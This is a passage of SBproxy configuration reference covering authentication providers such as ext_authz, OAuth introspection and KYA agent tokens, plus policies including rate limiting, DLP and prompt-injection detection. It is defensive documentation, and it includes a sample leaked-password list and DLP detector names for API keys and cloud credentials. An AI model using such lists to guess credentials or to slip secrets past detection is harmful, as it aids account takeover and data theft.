  type: bot_auth
  clock_skew_seconds: 30
  agents:
    - name: openai-gptbot
      key_id: openai-2026-01
      algorithm: ed25519
      public_key: ${OPENAI_BOT_PUBKEY}
      required_components: ["@method", "@target-uri", "@authority"]
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `agents` | list | `[]` | Inline agent keys. Each `key_id` must be unique. |
| `directory` | object | unset | HTTPS hosted-directory lookup and refresh settings. |
| `clock_skew_seconds` | int | 30 | Tolerance for signature `created` and `expires` values. |
| `nonce_policy` | string | `strict` | Replay behavior when a nonce store is installed: `strict` or `permissive`. |

See [web-bot-auth.md](web-bot-auth.md) for directory validation, required
signature components, and replay behavior.

### cap

Validate Crawler Authorization Protocol tokens from `CAP-Token` or the
`Authorization: CAP` scheme. Configure a JWKS URL or an inline JWKS document;
`jwks_url` wins when both are present.

```yaml
authentication:
  type: cap
  jwks_url: https://issuer.example.com/.well-known/cap/keys.json
  audience: api.example.com
  require_agent_binding: true
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `jwks_url` | string | unset | Remote JWKS endpoint. One of `jwks_url` or `jwks_static` is required. |
| `jwks_static` | object | unset | Inline JWKS for offline or pre-issued-token deployments. |
| `jwks_refresh_secs` | int | 3600 | Remote JWKS cache interval, clamped to at least 30 seconds. |
| `audience` | string | request `Host` | Explicit token audience. |
| `require_agent_binding` | bool | false | Require the token subject to match a resolved agent identity. |

### oidc

Run an OpenID Connect authorization-code and PKCE login flow, then authenticate
later requests from a sealed session cookie.

```yaml
authentication:
  type: oidc
  authorization_endpoint: https://idp.example.com/authorize
  token_endpoint: https://idp.example.com/oauth/token
  jwks_uri: https://idp.example.com/.well-known/jwks.json
  issuer: https://idp.example.com
  client_id: sbproxy
  client_secret: ${OIDC_CLIENT_SECRET}
  cookie_secret: ${OIDC_COOKIE_SECRET}
```

The seven fields shown above are required. `cookie_secret` must contain at
least 32 bytes after secret resolution. Optional fields include `scope`,
`redirect_path`, session and transaction TTLs, userinfo, and RP-initiated
logout settings. See [auth-oidc.md](auth-oidc.md) for the full field table and
browser flow.

### ext_authz

Ask an authorization service you run whether to admit each request. The proxy POSTs a JSON check document carrying the request's method, its path and query, and an allowlisted subset of its headers; the service answers `{"allowed": true}` or a refusal it shapes itself. The wire shape is the one Envoy's `ext_authz` HTTP service filter and the OpenPolicyAgent Envoy plugin speak, so a service written for either answers this provider unchanged.

```yaml
origins:
  "api.example.com":
    action:
      type: proxy
      url: https://backend.internal:8080
    authentication:
      type: ext_authz
      url: http://authz.internal:9002/check
      timeout_ms: 250
      headers_to_forward: [authorization, x-tenant]
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `type` | string | required | Must be `ext_authz` |
| `url` | string | required | Check endpoint. Must be `http://` or `https://` |
| `timeout_ms` | int | 250 | Deadline for one check, in milliseconds. `0` is refused, because reqwest reads it as no timeout |
| `failure_mode_allow` | bool | `false` | Admit the request when the check fails instead of refusing it |
| `headers_to_forward` | list | `[]` | Request headers copied into the check document. Empty forwards none |

The check document and the answer:

```json
{"method": "GET", "path": "/orders/42?full=1", "headers": {"x-tenant": "acme"}}
```

```json
{"allowed": false, "status": 402, "body": "quota exhausted",
 "headers": {"x-quota-reset": "3600"}}
```

`allowed` is the only field the service has to return. On a refusal, `status` (any 4xx; anything else is clamped to `403`) and `body` shape what the client sees, and `headers` are attached to that response, which is how a service returns its own `WWW-Authenticate` challenge or a `Retry-After`. On an allow, the service can name the authenticated caller in `subject`, or stamp any of `X-Forwarded-User`, `X-Auth-Request-User`, `X-Auth-User`, `X-User`, or `Remote-User`, and that name becomes the request's principal.

Four behaviors are worth knowing before you point this at a service:

- **`headers_to_forward` is an allowlist and it starts empty.** Nothing from the request reaches the service until you name it. That is deliberate: a default that forwarded everything would ship `Authorization` and `Cookie` to the authorization service on the first request after you set the URL. If you are moving a config off a build that linked the enterprise auth crate, that build read an empty list as "forward everything"; see [config-stability.md](config-stability.md#ext_authzheaders_to_forward--forwards-nothing-not-everything).
- **Failure is closed.** A service that times out, refuses the connection, or answers something that is not a check document refuses the request with a `503`. `failure_mode_allow: true` inverts that, and every request it admits is counted on `sbproxy_ext_authz_decisions_total{outcome="fail_open"}` rather than folded into the allow count, because a request that proceeded without the decision being made is the event worth alerting on.
- **Headers on an allow are not copied upstream.** The service can name a subject, and that lands on the principal, but arbitrary header injection into the upstream request is `forward_auth`'s `trust_headers`, not this provider.
- **Like `ldap_auth` and `forward_auth`, this dials out on the request path.** Authentication runs before an origin's `policies:`, so the origin's own `rate_limit` cannot cap what this provider dials. Budget `timeout_ms` for a service sitting next to the proxy.

Unlike `forward_auth`, this provider composes inside an `authentication:` list. It also evaluates on the HTTP/3 dispatch path, which is not a reason to pick it today: [HTTP/3 is not served by this build](#http3-fields).

See [examples/auth-ext-authz/](../examples/auth-ext-authz/) for a runnable setup with a stub authorization service.

### oauth_introspection

Validate an opaque bearer token by asking the authorization server that issued it (RFC 7662). The proxy POSTs the token to the introspection endpoint, authenticating itself with the configured client credentials, and reads back `{"active": true, ...}`.

Reach for this instead of [`jwt`](#jwt) when your tokens are opaque reference tokens rather than JWTs, or when a revoked token has to stop working immediately rather than at its expiry. The cost is a network round trip on the request path, which the verdict cache amortizes.

```yaml
origins:
  "api.example.com":
    action:
      type: proxy
      url: https://backend.internal:8080
    authentication:
      type: oauth_introspection
      introspection_url: https://idp.example.com/oauth2/introspect
      client_id: sbproxy-gateway
      client_secret: ${INTROSPECTION_CLIENT_SECRET}
      required_scopes: [api.read]
      cache_ttl: 60
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `type` | string | required | Must be `oauth_introspection` |
| `introspection_url` | string | required | RFC 7662 introspection endpoint |
| `client_id` | string | required | Client id the proxy authenticates to the endpoint with |
| `client_secret` | string | none | Client secret. Omit for a public client. Takes the usual secret reference forms (`${VAR}`, `env:`, `file:`, `vault://`) |
| `token_type_hint` | string | none | RFC 7662 `token_type_hint` sent with the request |
| `cache_ttl` | int | 60 | Seconds a verdict is cached. `0` reaches the authorization server on every request |
| `timeout_secs` | int | 5 | Deadline for one introspection call |
| `required_scopes` | list | `[]` | Scopes the token must carry. Empty admits any active token |

What the caller sees: an active token with every required scope is admitted, and the response's `sub` (or `username`, which Auth0 and Okta return for resource-owner flows) becomes the principal. An inactive token gets `401` with `WWW-Authenticate: Bearer error="invalid_token"`, or a bare `Bearer` challenge when no token was presented at all. An active token missing a scope gets `403` with `error="insufficient_scope"` naming the scope. An introspection endpoint that cannot be reached gets `503`, per RFC 7662 section 2.3: the caller's credential is not what is in question.

The verdict cache is keyed on the SHA-256 of the token, so it never holds a plaintext credential, and it is capped at 10,000 entries so a flood of invented tokens evicts itself rather than growing the map. It shortens a token's life and never lengthens it: when the introspection response carries `exp`, the entry expires at whichever of `exp` and `cache_ttl` comes first. Transport failures are never cached, so an outage does not pin a refusal in place after the server recovers. Set `cache_ttl: 0` when a revocation has to take effect on the very next request.

See [examples/auth-oauth-introspection/](../examples/auth-oauth-introspection/) for a runnable setup with a stub introspection endpoint.

### kya

Verify a Know Your Agent token: an issuer-signed identity an AI agent presents in the `X-Skyfire-KYA` header, carrying who the agent is, who operates it, and optionally how much it can spend.

This is the provider for admitting agent traffic by identity rather than by credential. A verified token establishes an agent id, a vendor, an agent class, and an advisory spend balance, and every one of those is readable from policy as `request.kya.*`, from the token's own claims rather than from the User-Agent-derived resolver.

```yaml
origins:
  "api.example.com":
    action:
      type: proxy
      url: https://backend.internal:8080
    authentication:
      type: kya
      issuers:
        - url: https://api.skyfire.example
          jwks_refresh_interval_secs: 3600
          stale_grace_secs: 86400
      min_kyab_balance: 1000
      min_kyab_currency: USD
      fail_open: false
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `type` | string | required | Must be `kya` |
| `issuers` | list | required | Trusted issuers. At least one entry |
| `issuers[].url` | string | required | Issuer URL, matched verbatim against the token's `iss`. Must be `https://` |
| `issuers[].jwks_refresh_interval_secs` | int | 3600 | How long a fetched JWKS and denylist stay fresh. Clamped to 300 to 86400 |
| `issuers[].stale_grace_secs` | int | 86400 | How long past the refresh interval a cached copy still serves while the issuer is unreachable |
| `min_kyab_balance` | int | none | Spend floor in the smallest unit of `min_kyab_currency`. A verified token below it is refused with `402` |
| `min_kyab_currency` | string | `USD` | Currency the floor is denominated in. A balance in another currency counts as zero |
| `fail_open` | bool | `false` | Admit the request when the issuer's directory cannot be reached |

Verification is the eight steps the KYA profile defines, in order: decode the header, pin `alg` to ES256 or RS256, check `iss` against the allowlist before any network fetch, resolve the signing key from the issuer's `/.well-known/jwks.json`, verify the signature, verify `exp` and `iat` with two seconds of skew, check that `aud` names this gateway's hostname or the literal `*`, and check the token's `jti` against the issuer's `/.well-known/kya-denylist.json`. A `404` on the denylist is an empty denylist, not an outage: an issuer that has revoked nothing does not have to publish the document.

A token carrying no `jti` cannot be revoked, so it is refused when the issuer publishes a non-empty denylist. Admitting it would make "revocation is checked on every verification" false for a whole class of token while the fetch still succeeds and logs nothing. An issuer with nothing to revoke has made no promise this breaks, so a token with no `jti` still verifies against an empty denylist.

What the caller sees: a verified token is admitted, and its `sub` becomes the principal. A missing token gets `401`, and so does an expired, revoked, or otherwise invalid one. A verified token below `min_kyab_balance` gets `402 Payment Required`, which is a status a paying client can act on, rather than the `401` that would tell it to fetch a credential it already has. An issuer whose JWKS or denylist could not be fetched, with no cached copy still inside its stale-grace window, gets `503` unless `fail_open: true`.

Three ways a balance is worth nothing against the floor, and each is a refusal rather than a guess: it names a currency other than `min_kyab_currency`, its `expires_at` has passed, or its `expires_at` does not parse. The currency rule matters more than it looks: 5000 JPY is about 32 dollars and 5000 COP is about a dollar twenty, so a floor of `1000` meaning ten dollars is cleared by both if the comparison is numeric. The proxy holds no exchange rate and will not invent one.

Leave `min_kyab_balance` unset and the balance gates nothing; it is still carried to policy as `request.kya.kyab_balance.amount`, alongside `request.kya.kyab_balance.currency`. Both, because the amount alone is not comparable for the same reason the floor is denominated: a policy writing its own comparison needs to know what the number is in.

Verdicts are not cached. The JWKS and the denylist are, per issuer, but a token is verified on every request, because a cached verdict is a revocation the proxy has decided not to see.

Every verdict, including the refusing ones, is published on `sbproxy_kya_verdicts_total{verdict}`. The verdict also feeds the [trust tier](trust-tiers.md): a verified token earns `strong`, a presented-and-rejected one drops the request to `suspicious`, and an unreachable directory stays neutral, because a fetch failure is not evidence about the caller.

Two verdicts reach `request.kya.verdict`, and only two, because only two continue into the policy chain: `verified`, and `directory_unavailable` when `fail_open: true` admitted the request anyway. Every other verdict refuses, so no policy runs to read it. A policy that tightens behavior while an issuer is down is therefore written against `directory_unavailable` and works; one written against `revoked` never fires, because a revoked token never gets that far.

A verified token also populates `request.kya.agent_id`, `request.kya.agent_class`, `request.kya.vendor`, and `request.kya.kya_version` from the token's own claims. `request.kya.agent_id` is deliberately not `request.agent_id`: the latter is what the agent-class resolver worked out from the User-Agent and the operator catalog, and pinning an identity on it is pinning something the caller chose. Pin `request.kya.agent_id` when you mean the identity the issuer signed.

See [examples/auth-kya/](../examples/auth-kya/) for a runnable setup with a local issuer fixture.

### noop

The no-op auth provider accepts every request without checking credentials. Set this explicitly to mark an origin as unauthenticated, so the intent is obvious in the config.

```yaml
authentication:
  type: noop
```

### Per-credential metadata

Every inbound auth provider accepts an optional metadata block on each credential entry. When a credential matches, its metadata travels onto the request principal and surfaces in the access log under `principal_kind`, in metrics labels, and in policy scripts that read `principal.attrs.*`. The metadata fields are:

| Field | Type | Description |
|-------|------|-------------|
| `project` | string | Project the credential belongs to. Drives the `project` column on the access log and metric labels. |
| `user` | string | User the credential represents or its owner. |
| `team` | string | Team or cost-center grouping. |
| `tags` | list of strings | Operator-supplied tags. Stamped on `principal.attrs.tags`. |
| `metadata` | map of strings | Free-form metadata copied off the credential. Stored as a sorted map for deterministic log lines. |

The block is optional on every provider; existing configs that use the bare-string shorthand (a list of plain secrets) continue to parse unchanged. Operators opt in per credential.

#### Bearer

The full-shape entry replaces a bare string. Mixed lists are allowed.

```yaml
authentication:
  type: bearer
  tokens:
    - "shared-token-no-metadata"
    - secret: ${SERVICE_TOKEN_1}
      project: foundation
      team: platform
      tags: [internal]
      metadata:
        cost_center: eng-001
```

#### API key

```yaml
authentication:
  type: api_key
  header_name: X-Api-Key
  api_keys:
    - "bare-key"
    - secret: ${TEAM_FRONTEND_KEY}
      project: foundation
      team: frontend
```

#### Basic auth

Metadata fields sit flat alongside `username` and `password` on each user entry.

```yaml
authentication:
  type: basic_auth
  realm: "Admin Panel"
  users:
    - username: admin
      password: ${ADMIN_PASSWORD}
      project: foundation
      team: platform
      tags: [admin]
```

#### JWT

The JWT provider takes a single nested `attrs:` block (rather than per-token metadata) because the secret material is the JWKS or shared secret, not a list of static tokens. The optional `roles_claim:` list names the claims to copy onto `principal.attrs.roles`; the first claim present wins.

```yaml
authentication:
  type: jwt
  jwks_url: https://auth.example.com/.well-known/jwks.json
  issuer: https://auth.example.com
  audience: my-api
  attrs:
    project: foundation
    team: platform
  roles_claim:
    - roles
    - groups
```

#### OIDC

Same nested `attrs:` shape as JWT.

```yaml
authentication:
  type: oidc
  authorization_endpoint: https://idp.example.com/authorize
  token_endpoint: https://idp.example.com/oauth/token
  jwks_uri: https://idp.example.com/.well-known/jwks.json
  issuer: https://idp.example.com
  client_id: sbproxy
  client_secret: ${OIDC_CLIENT_SECRET}
  cookie_secret: ${OIDC_COOKIE_SECRET}
  attrs:
    project: foundation
    team: platform
```

The access log records the matched principal's source under the `principal_kind` column (`bearer`, `api_key`, `basic_auth`, `jwt`, `oidc`, `virtual_key`, `bot_auth`, `cap`, `forward_auth`, `ldap_auth`, `ext_authz`, `oauth_introspection`, `kya`, `plugin`, or `none` when no provider is configured). See [access-log.md](access-log.md) for the full column reference.

---

## Policies

Policies are evaluated before the action runs. They enforce rate limits, security rules, and access controls. The `policies` field is a sibling of `action` and is an array of policy objects.

SBproxy ships thirty policy types: `rate_limiting`, `rate_limit_budget`, `ip_filter`, `expression`, `rego`, `waf`, `ddos`, `csrf`, `security_headers`, `request_limit`, `sri`, `assertion`, `request_validator`, `body_threat_protection`, `content_digest`, `concurrent_limit`, `ai_crawl_control`, `object_authz`, `exposed_credentials`, `page_shield`, `dlp`, `openapi_validation`, `prompt_injection_v2`, `http_framing`, `agent_class`, `a2a`, `semantic_constraint`, `agent_budget`, `geoip`, and `user_agent_parser`. This page documents the most common ones; the rest have their own pages.

### rate_limiting

Rate limit clients to prevent abuse and protect backend resources. Uses a token bucket by default (in-process) or a fixed-window counter (when an L2 Redis backend is configured).

```yaml
origins:
  "api.example.com":
    action:
      type: proxy
      url: https://backend.internal:8080
    policies:
      - type: rate_limiting
        requests_per_minute: 60
        burst: 10
        algorithm: token_bucket
        whitelist:
          - 10.0.0.0/8
```

Clients exceeding the limit receive `429 Too Many Requests` with a `Retry-After` header.

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `type` | string | required | Must be `rate_limiting` |
| `requests_per_second` | float | | Per-second token refill rate |
| `requests_per_minute` | float | | Per-minute token refill rate (mutually exclusive with `requests_per_second`) |
| `burst` | int | derived from rate | Maximum burst capacity |
| `algorithm` | string | `token_bucket` | Algorithm hint: `token_bucket`, `fixed_window`. The runtime picks based on whether an L2 backend is attached. |
| `headers` | object | | `X-RateLimit-*` and `Retry-After` header configuration |
| `whitelist` | list | | IPs/CIDRs exempt from rate limiting |

Distributed rate limiting: a single-instance deployment tracks counters in memory. Multi-instance deployments have two options, and they enforce differently.

**An L2 Redis cache is exact.** Every replica increments one shared counter, so the cluster admits exactly the configured limit. This is the option to pick when the limit is a hard promise.

```yaml
proxy:
  l2_cache_settings:
    driver: redis
    params:
      dsn: redis://redis.internal:6379/0
```

**A gossip mesh with no Redis is approximate.** When `proxy.cluster` is configured and no L2 store is, each node admits against its own count plus a view of its peers refreshed every 3 seconds. That view is up to one refresh stale, so the cluster over-admits by at most:

```
overshoot = (nodes - 1) x rate_per_second x 3
```

For 600 requests per minute across three nodes that is 60 extra requests, so the cluster admits about 660 rather than 600. Five nodes admit about 720. Before this converged, the same configuration admitted 1800 and 3000: each node enforced the full limit by itself.

Watch `sbproxy_rate_limit_cluster_peer_denials_total` to confirm it is working. The counter rises when a node denied a request that its own count alone would have admitted, which means peer counts are arriving. Flat at zero while several nodes serve the same limited key means they are not, and each node is enforcing its own limit while believing it is enforcing a shared one.

**`requests_per_second` does not converge on a mesh.** A one second window closes before a peer's count can arrive, so per-second limits are enforced per node and the proxy warns at boot. Use `requests_per_minute`, which converges, or configure an L2 store for an exact per-second limit.

### ip_filter

Allow or block requests by client IP address or CIDR range. Useful for locking down internal services or blocking known bad actors.

```yaml
policies:
  - type: ip_filter
    whitelist:
      - 10.0.0.0/8
      - 192.168.1.0/24
      - 172.16.0.0/12
    blacklist:
      - 10.0.0.99/32
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `type` | string | required | Must be `ip_filter` |
| `whitelist` | list | | CIDR ranges that are explicitly permitted. Empty allows everything. |
| `blacklist` | list | | CIDR ranges that are explicitly denied. |

If `whitelist` is non-empty, the client IP must match at least one entry. If `blacklist` is non-empty, the client IP must not match any entry. Both lists may be used together.

### expression

CEL expression that evaluates to allow or deny a request. Pick this for custom access control logic that goes beyond simple IP or key checks.

```yaml
policies:
  - type: expression
    expression: 'request.headers["x-internal"] == "true"'
    deny_status: 403
    deny_message: "internal traffic only"
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `type` | string | required | Must be `expression` |
| `expression` | string | required | CEL expression returning a boolean. Alias: `cel_expr`. |
| `deny_status` | int | 403 | HTTP status code when denied. Alias: `status_code`. |
| `deny_message` | string | "forbidden by policy" | Body returned with the deny status code. |

Expression policies evaluate CEL only. For Lua-driven access control, use a request modifier with a `lua_script`.

### request_validator

Validate request bodies against a JSON Schema at the edge. Inbound payloads that fail validation are rejected with a configurable status (default 400) and a typed JSON error body, before they reach the upstream.

```yaml
policies:
  - type: request_validator
    content_types: [application/json]   # default
    status: 400                         # default
    error_content_type: application/json
    schema:
      type: object
      required: [name, age]
      properties:
        name: { type: string, minLength: 1 }
        age:  { type: integer, minimum: 0 }
      additionalProperties: false
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `schema` | JSON | required | JSON Schema document. Compiled once at config-load. |
| `content_types` | array | `[application/json]` | Media types this policy applies to. Other types pass through untouched. Matched case-insensitively against the leading media type (parameters are ignored). |
| `status` | int | 400 | HTTP status returned on validation failure. |
| `error_body` | string | structured JSON | Optional rejection body. Default is `{"error":"...","detail":"<location>"}` with no echoed payload. |
| `error_content_type` | string | `application/json` | Content-Type for the rejection body. |

The proxy buffers the request body locally until validation completes, then either releases it as one chunk to the upstream or aborts with the configured rejection. The validation buffer is capped at 8 MiB; a body past the cap is rejected with `413` before validation runs. Remote `$ref` resolution in schemas is disabled at the workspace level so a malicious schema cannot become an SSRF primitive. The rejection body never echoes the offending payload back to the caller, only the JSON path where validation failed.

See [example 81](../examples/request-validator/sb.yml).

### openapi_validation

Load an OpenAPI 3.0 document at startup and validate each request body against the matching operation's `requestBody` schema. Requests whose path + method are not described in the spec, or whose `Content-Type` has no schema, are passed through. Full reference: [openapi-validation.md](openapi-validation.md).

```yaml
policies:
  - type: openapi_validation
    mode: enforce             # or 'log'
    status: 422               # status returned on enforce-mode rejection
    spec:
      openapi: "3.0.3"
      info: {title: my-api, version: "1.0"}
      paths:
        "/users/{id}":
          post:
            requestBody:
              required: true
              content:
                application/json:
                  schema:
                    type: object
                    required: [name]
                    additionalProperties: false
                    properties:
                      name: {type: string, minLength: 1}
                      age:  {type: integer, minimum: 0, maximum: 150}
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `spec` | object | required* | Inline OpenAPI document. *One of `spec` or `spec_file` is required. |
| `spec_file` | string | required* | Path to an OpenAPI document on disk (`.json` or `.yaml`). |
| `mode` | string | `enforce` | `enforce` rejects mismatched bodies; `log` warns and forwards. |
| `status` | int | 400 | Status returned in `enforce` mode on validation failure. |
| `error_body` | string | auto | Optional rejection body. Defaults to a JSON object naming the failing JSON pointer. |
| `error_content_type` | string | `application/json` | `Content-Type` for the rejection body. |
| `deprecation_headers` | object | off | Emit RFC 9745 / RFC 8594 deprecation headers on responses for operations the loaded spec marks `deprecated: true`. Same fields as the route-level block minus the spec flag: `deprecated`, `sunset`, `successor`, `link`, `after_sunset`. The spec flag carries no date, so this block supplies the values. A route-level `deprecation:` block wins over it. See [API deprecation](#api-deprecation-rfc-9745--rfc-8594). |

OpenAPI path templates compile to anchored regexes at startup; per-operation schemas compile once. The rejection body lists only the offending JSON pointer, not the value itself, to keep the surface area an attacker can probe small.

See [example 97](../examples/openapi-validation/sb.yml).

### concurrent_limit

Cap in-flight requests per key. Distinct from `rate_limiting`, which throttles RPS. Concurrent limits protect backends with low concurrency budgets: legacy SOAP services, DB-bound endpoints, GPU inference workers, anywhere slow requests pile up faster than they drain.

```yaml
policies:
  - type: concurrent_limit
    max: 50
    key_by: api_key   # or ip, route, header:<name>, or global (default)
    status: 503
    error_body: '{"error":"too many concurrent requests"}'
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `max` | int | required | Maximum concurrent requests per key. Must be `> 0`. |
| `key_by` | string | `global` | Bucket strategy: `global`, `ip`, `api_key`, `route`, or `header:<name>`. Route keys use the request path without its query. |
| `key` | string | unset | Legacy schema-v1 spelling retained for compatibility. Supports `origin`, `ip`, and `api_key`; use `key_by` in new configuration. |
| `status` | int | 503 | HTTP status when the limit is exceeded. |
| `error_body` | string | unset | Optional response body for rejections. |

Each accepted request takes a permit; the permit is released when the request finishes (success, error, panic, or client disconnect). Idle keys are removed from the sharded map, so one-off client keys do not accumulate after their requests drain.

See [example 82](../examples/concurrent-limit/sb.yml).

### ai_crawl_control

Pay Per Crawl: respond with `402 Payment Required` to AI crawlers that arrive without a valid `Crawler-Payment` token. Each token redeems once. Full reference: [ai-crawl-control.md](ai-crawl-control.md).

```yaml
policies:
  - type: ai_crawl_control
    price: 0.001
    currency: USD
    crawler_user_agents: [GPTBot, ChatGPT-User, ClaudeBot, anthropic-ai, Google-Extended, PerplexityBot, CCBot]
    valid_tokens:
      - tok_a89be2f1
      - tok_b7cf012e
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `price` | float | unset | Price emitted in the challenge body and the `price=` challenge parameter. |
| `currency` | string | `USD` | ISO-4217 code surfaced in the challenge. |
| `header` | string | `crawler-payment` | Header carrying the payment token. |
| `crawler_user_agents` | list | major AI crawler defaults | Case-insensitive substring matches against User-Agent. Empty list treats every GET/HEAD as a crawler. |
| `valid_tokens` | list | `[]` | Seeds the in-memory single-use ledger, which is per process. A fleet that has to spend one token across replicas configures the HTTP ledger client instead; see [ai-crawl-control.md](ai-crawl-control.md#http-ledger). |

Only `GET` and `HEAD` are subject to charging. `POST`/`PUT`/`PATCH`/`DELETE` bypass.

### exposed_credentials

Detect requests carrying a known-leaked password against a static exposure list. Tags the upstream request with `exposed-credential-check: leaked-password` (default) or rejects the request outright. Full reference and rollout guidance: [exposed-credentials.md](exposed-credentials.md).

```yaml
policies:
  - type: exposed_credentials
    action: tag                       # or "block"
    passwords:                        # plaintext, hashed at compile-time
      - password
      - password123
    sha1_hashes:                      # uppercase or lowercase hex
      - 5BAA61E4C9B93F3F0682250B6CF8331B7EE68FD8
    sha1_file: /etc/sbproxy/leaked-sha1.txt   # one hash per line; `#` comments
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `provider` | string | `static` | `static` is the only provider that ships. Any other value, `hibp` included, is rejected at config load. |
| `action` | string | `tag` | `tag` stamps the configured header on the upstream request. `block` returns `403`. |
| `header` | string | `exposed-credential-check` | Header name when `action: tag`. |
| `passwords` | list | `[]` | Plaintext passwords. Hashed at compile time; the source strings are not retained on the policy. |
| `sha1_hashes` | list | `[]` | Inline SHA-1 hex hashes. |
| `sha1_file` | string | unset | Path to a file with one SHA-1 hex hash per line. |

The policy refuses to compile when no list is supplied. SHA-1 uppercase hex matches the format HIBP returns from its range queries, so a downloaded list drops onto disk without preprocessing.

### page_shield

Stamps a Content Security Policy header on every proxied response and runs an intake endpoint at `/__sbproxy/csp-report` for browser-emitted violation reports. Reports are logged structured under the `sbproxy::page_shield` tracing target so logpush sinks pick them up.

```yaml
policies:
  - type: page_shield
    mode: report-only           # or "enforce"
    directives:
      - "default-src 'self'"
      - "script-src 'self' https://cdn.example"
      - "img-src 'self' https: data:"
    report_path: /__sbproxy/csp-report   # default
    report_to_group: csp-endpoint        # optional; emits report-to too
    respect_upstream: false              # yield to an upstream-supplied CSP
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `mode` | string | `report-only` | `report-only` emits `Content-Security-Policy-Report-Only`. `enforce` emits `Content-Security-Policy`. |
| `directives` | list | required, non-empty | Each entry is a complete CSP directive (`default-src 'self'`). Joined with `; `. |
| `report_path` | string | `/__sbproxy/csp-report` | Override the intake path. Used in the auto-appended `report-uri` directive. |
| `report_to_group` | string | unset | When set, the policy also emits `report-to <name>` for the modern Reporting API. |
| `respect_upstream` | bool | `false` | When `true` and the upstream already emits a CSP header, the policy yields and does not write its own. |

The intake accepts up to 64 KiB per report via `POST /__sbproxy/csp-report` and returns `204 No Content`. The header is applied to proxied responses and to generated ones alike: `static`, `mock`, `echo`, `beacon`, and `redirect` actions carry it the same way a proxied origin does. Actions with their own protocol write paths (`mcp`, `storage`, `ai_proxy`, plugin actions) do not.

### dlp

Data Loss Prevention scan over the request URI and headers. Matches against the configured detector catalog (or every default when `detectors: []`) and either tags the upstream request with `dlp-detection: <names>` (`action: tag`, default) or rejects with `403` (`action: block`). The scan does not mask or rewrite anything it finds; `action: tag` stamps a header, `action: block` refuses. `replacement` on a custom `rules:` entry is accepted because the rule type is shared with the `pii:` redactor, and DLP does not apply it. Response bodies are out of scope. Runnable at [`examples/dlp-catalog/`](../examples/dlp-catalog/).

```yaml
policies:
  - type: dlp
    action: tag                  # or "block"
    detectors: []                # empty = enable every default detector
    rules:                       # optional custom rules layered on top
      - name: internal_ticket
        pattern: '\bTICKET-\d{6}\b'
        replacement: '[REDACTED:TICKET]'
        anchor: 'TICKET-'
```

**Default detectors:** `email`, `us_ssn`, `credit_card`, `phone_us`, `ipv4`, `openai_key`, `anthropic_key`, `aws_access`, `github_token`, `slack_token`, `iban`.

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `detectors` | list | `[]` (all defaults) | Detector names to enable. Unknown names fail at compile-time. |
| `action` | string | `tag` | `tag` stamps `<header>: <detector_csv>` on the upstream. `block` returns `403`. |
| `direction` | string | `request` | `request` is the only path enforced today; `response` and `both` are accepted for forward compatibility. |
| `header` | string | `dlp-detection` | Header name when `action: tag`. |
| `scan_body` | bool | `true` | When the snapshot carries a body, include it in the scan. The live request-filter chain currently always snapshots an empty body, so this knob does not change what an operator sees on the wire today. |
| `body_max_bytes` | int | `16384` | Maximum bytes of that body scanned when `scan_body` is true and a body is present in the snapshot. |
| `rules` | list | `[]` | Custom regex rules layered on top of the catalog. Same shape as the `pii.rules` block on `ai_proxy` origins. |

The scan covers the request URI (path + query) and request headers. Auth-class headers (`Authorization`, `Cookie`, `Set-Cookie`) are excluded so tokens carried by design don't self-flag. `scan_body` defaults true and `body_max_bytes` defaults 16384; those knobs are what the enforcer uses when a body is present in the snapshot it receives. The request-filter policy chain currently snapshots with an empty body and DLP does not opt into body buffering, so a secret that appears only in the POST body is not seen. URI and header matches still fire.

Every hit also carries bounded detection spans: an entity type plus a byte offset and length for each match, never the matched value itself. Offsets are relative to the segment that produced the span: the URI text (path + query), the individual header value that matched, or the capped, lossily decoded body text when a body is in the snapshot. A span does not name its segment, so treat offsets as evidence within one of those three coordinate spaces rather than positions in the raw request. The merged list is capped at 32 spans across the whole scan, filled round-robin across the URI, header, and body matches so no one segment can crowd the others out of the cap; everything past the cap is counted, not carried. `action: block` folds a compact summary of the count (and how many were dropped past the cap) into the `403` message, which is also what lands in the admin console's per-request `deny_reason` column.

### prompt_injection_v2

Successor to the legacy `injection` / `prompt_injection` guardrail names. The v2 policy splits detection from enforcement: a swappable detector returns a score in `[0.0, 1.0]` plus a categorical label, and the policy maps the score onto an action. When `detector` is omitted, a complete verified local model pair selects `inprocess`; when both artifacts are absent, SBproxy logs the resolved paths once and selects `heuristic-v1`. Partial or invalid artifacts fail startup rather than silently downgrading.

```yaml
policies:
  - type: prompt_injection_v2
    action: tag                         # tag (default) | block | log
    # detector omitted: verified local auto-selection
    threshold: 0.5                      # fires when score >= threshold
    detector_config:
      model_path: /var/lib/sbproxy/models/injection/model.onnx
      tokenizer_path: /var/lib/sbproxy/models/injection/tokenizer.json
      model_sha256: 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
      tokenizer_sha256: abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789
    score_header: x-prompt-injection-score
    label_header: x-prompt-injection-label
    block_body: 'prompt injection detected'
    block_content_type: text/plain
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `detector` | string | auto | Explicit `heuristic-v1`, `inprocess`, `sidecar`, or a registered custom name. Omission selects a verified local pair when present, otherwise the heuristic. Explicit choices always win. |
| `detector_config.model_path` | path | classifier cache | Local ONNX path. In auto mode, configured paths take precedence over `<user-cache-dir>/sbproxy/models/prompt-injection-v2/model.onnx`. |
| `detector_config.tokenizer_path` | path | classifier cache | Matching tokenizer path. Both paths must be configured together; partial presence is an error. |
| `detector_config.model_sha256` | string | trusted registry pin | Required with `tokenizer_sha256` unless `detector_config.model` names a registry entry with a complete trusted pair. |
| `detector_config.tokenizer_sha256` | string | trusted registry pin | Required with `model_sha256`; 64 hexadecimal characters. |
